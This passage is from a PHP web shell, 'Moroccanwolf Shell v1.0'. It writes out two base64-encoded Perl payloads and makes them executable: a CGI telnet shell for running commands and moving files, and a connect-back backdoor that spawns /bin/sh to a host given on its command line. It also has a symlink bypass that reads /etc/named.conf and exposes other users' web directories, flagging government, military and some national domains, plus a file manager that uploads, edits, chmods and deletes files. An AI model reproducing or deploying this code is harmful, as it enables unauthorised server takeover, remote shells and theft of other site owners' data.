JmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlW
PVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmlu
dFBhZ2VIZWFkZXIoImMiKTsNCgkJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxl
ICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0
b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5E
DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0N
CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7
DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJv
bSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2Fu
IGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmll
ZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlm
KG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7
DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNU
RE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmls
ZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQt
VHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6
ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7
IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShT
RU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQ
YWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAk
ISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9
DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxl
ZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0K
IyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUg
Y2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0
aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlz
IHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBm
aWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9e
XFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBw
YXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0K
CWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFy
Z2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAk
UGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2Ug
aGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZp
bGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsN
CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIg
d2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwg
aXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxl
LCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwg
cHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7
DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZVVwbG9hZEZvcm07DQoJCSZQ
cmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0K
DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCglwcmludCAiVXBsb2FkaW5nICRUcmFu
c2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVh
bGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXRO
YW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJh
bnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQx
Ow0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0
aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJ
aWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQlwcmlu
dCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgll
bHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRU
YXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJ
cHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsN
CgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCXBy
aW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlw
cmludCAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCXByaW50ICIiOw0KCSZQcmludENvbW1h
bmRMaW5lSW5wdXRGb3JtOw0KDQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRz
IHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQs
IGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmls
ZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlk
ZXMgYSBsaW5rDQojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIERvd25sb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmls
ZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5z
ZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkNCgkj
IGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJ
aWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5U
ICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJ
JFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2
ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikg
PX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsN
Cgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0K
CXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhh
dmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1Bh
Z2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWlu
IFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NS
SVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBh
c3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmls
ZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9
Ow0KJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNp
ZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29t
bWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1
cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZElu
ID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJs
b2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJm
b3JtTG9naW47DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMg
dG8gcnVuIGEgY29tbWFuZA0Kew0KCSZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24g
ZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZp
bGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3du
bG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9n
b3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=100% height=100% frameborder=0></iframe> ";


echo '
<br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
';
}


if (isset($_GET['sym'])){
echo "<h6>Symlink Bypass </h6>";
echo '<form action="" method="post">';

@set_time_limit(0);

echo "<center>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex readme.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";

}
}
}
}

echo "</table>";   

echo '
<br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3></center>
';
}

if (isset($_GET['kill'])){

echo '<center><h3>Do you really want to delete this shell ?</h3></center><br><br>';
?>
<center><b><a style="color:#ff0000;" href="?kill=killit"><h3>Yes</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
<a style="color:#ff0000;" href="<?php echo $_SERVER['PHP_SELF']; ?>">No</h3></a></b></center><br><br>

<?php
}

if(isset($_GET['kill']) && $_GET['kill'] == "killit"){
$file = $_SERVER['PHP_SELF'];
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
die('<br><br><b class="tmp"><font color="#ff0000" size="2pt"><center><h3>Shell has been Killed...Take Care And Stay Safe</h3></center></font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');
else
echo '<font color="#fff600" size="2pt"><h3>unlink error!</h3></font>';

}

if (isset($_GET['home'])){

$ip = gethostbyname($_SERVER["HTTP_HOST"]);

echo "<h4>server ip : $ip </h4><br> <h1> Moroccanwolf Shell v1.0 </h1><h4>Coded by Moroccanwolf | Team : Gcc-r00t.net</h4><h3>Facebook Page : https://www.facebook.com/Mwolfprogrammer </h3><br><h3>Greetz : Abdellah Elmaghribi - Hw 05 - x-agent - Virusx El - bl4ck-dz - Matrix Dz - Dr.Gilius - Kuroi'SH - MuhmadEmad - Bajtax  - Moh Ooasiic - Anas P!co - Gcc-r00t Members - Newbies  - All Moroccan Hackers  - Moroccan Resistance Team - My computer </h3> ";
echo "<br>
<h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
}

if (isset($_GET['upload'])){
    echo"<br><br><form method=post enctype=multipart/form-data>"; 
    echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
      if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<h3><b>Uploaded Done</b>-->".$_FILES["f"]["name"]."</h3>";}else{echo"<b>Not Uploaded";}}

echo "<br><br><br><br><br><br><br><br><br>
<h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }

function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
    return $info;}

echo '</h3>';
echo '<h3>';
echo '</td></tr><tr><td>';
if(isset($_GET['filesrc'])){
    echo "<tr><td><h3>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br /></h3>';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green"><h3>Edit File Done.</h3></font><br />';
            }else{
                echo '<font color="red"></h3>Edit File Error.</h3></font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
echo '</h3>';
 if(isset($_GET['file'])){


    echo '</center>';
    @$scandir = scandir($path);
    echo '<div id="content"><table width="1285" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';
    
     if(!is_writable($_GET['path'])){


} else{
    foreach($scandir as $dir){

        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?file&path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
echo "<br><br>
